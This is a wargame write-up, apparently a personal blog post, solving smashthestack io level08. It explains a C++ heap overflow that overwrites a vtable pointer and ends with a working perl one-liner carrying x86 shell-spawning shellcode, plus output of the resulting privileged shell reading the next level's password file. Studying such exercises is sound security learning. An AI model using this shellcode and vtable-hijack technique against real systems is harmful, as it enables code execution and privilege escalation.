Finally I got some time to write. I am going to try to summarize the process which I have had to pass to resolve the smash's level08.

The code for this exercise is the following.

```C++
 // writen by bla for io.smashthestack.org
#include <iostream>
#include <cstring>
#include <unistd.h>

class Number
{
        public:
                Number(int x) : number(x) {}
                void setAnnotation(char *a) {memcpy(annotation, a, strlen(a));}
                virtual int operator+(Number &r) {return number + r.number;}
        private:
                char annotation[100];
                int number;
};


int main(int argc, char **argv)
{
        if(argc < 2) _exit(1);

        Number *x = new Number(5);
        Number *y = new Number(6);
        Number &five = *x, &six = *y;

        five.setAnnotation(argv[1]);

        return six + five;
}
 
```

It is clear how the use of `memcpy` is insecure due to there is not sanitation on the argv[1] so we can write beyond the capacity of the member variable `annotation`.

To see if this fact is exploitable we need to figure out how is the layout of the class on memory. C++ classes are very similar with C’s structs. That means that the layout would be.

```
AAAAAAAAAAAAAAAAAAAANNNN

where:
A -> bytes of annotation
N -> bytes of number

```

But in this case we have an extra pointer which is normally known as `vtable`. So the layout would be as follows.

```
PPPPAAAAAAAAAAAANNNN
where:
P-> pointer of vtable
A-> bytes of annotation
N-> bytes of number
```

What is the goal of vtable in C++? This can be viewed as dynamic binding since is the way C++ resolve calls when the inheritances come out. The following [example](http://phrack.org/issues/56/8.html)  try to explain the concept.

```C++
#include <stdio.h>
#include <string.h>

class BaseClass
{
    private:
        char buffer[32];
    public:
        void SetBuffer(char *String)
        {
            strcpy(Buffer,String);
        }
        virtual void PrintBuffer()
        {
            printf(“%s\n”,Buffer);
        }
};

class MyClass1:public BaseClass
{
    public:
        void PrintBuffer()
        {
            printf(“MyClass1: “);
            BaseClass::PrintBuffer();
        }
};

class MyClass2:public BaseClass
{
    public:
        void PrintBuffer()
        {
            printf(“MyClass2: “);
            BaseClass::PrintBuffer();
        }
};

void main()
{
    BaseClass *Object[2];

    Object[0] = new MyClass1;
    Object[1] = new MyClass2; 

    Object[0]->SetBuffer(“string1”);
    Object[1]->SetBuffer(“string2”);
    Object[0]->PrintBuffer();
    Object[1]->PrintBuffer();
}

$ ./example
MyClass1: string1
MyClass2: string2
```

What’s going on here? Thanks to vtable the runtime can resolve which method should call. Vtable how we have said before has been created to support dynamic binding or dynamic dispatch. It is an array of functions. This functions will be set at runtime to point to the correct function to be called. That is why the Object[0] knows that when it needs to call the member function `PrintBuffer`, it must call the MyClass1’s function instead of BaseClass’s. The same happens with Object[1].

If in somehow we can overwrite the vtable we can hijack the flow of our program to execute arbitrary code. That is the problem of the code that we showed at the beginning. 

When we call `setAnnotation` on `five`, which is a reference to `x`, we are able to write beyond its space since we are using memcpy without sanitation. We overwrite `six` memory space, since it is after the five’s memory; with the consequence to overwrite vtable. After that, when the statement `return six + five` is called, that in reality is called `return six.operator+(five)`, the runtime look through the `vtable` to know the correct function to call. This is when the buffer overflow; that happens on the heap since the classes are created using `new`, can be exploited.

If we use gdb we can see the layout of the memory.

We have to write our shellcode in `annotation` and then rewrite the six’s vtable to redirect it to our shellcode. Finally to exploit this we need to execute the following.

```bash
/levels/level08 `perl -e ‘print “\x10\xa0\x04\x08\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80”,”A”x56,”\x0c\xa0\x04\x08”’`

sh-4.2$ id
uid=1008(level8) gid=1008(level8) euid=1009(level9) groups=1009(level9),1008(level8),1029(nosu)
sh-4.2$ cat /home/level9/.pass
XXXXXXXXXXX
``` 

Write a shellcode is a difficult task in which I have to go deeper. This exercise has been very helpful to understand the danger of vtable on C++ and how the classes are represented in memory. We must be careful when we develop software since you never know where the danger resides.
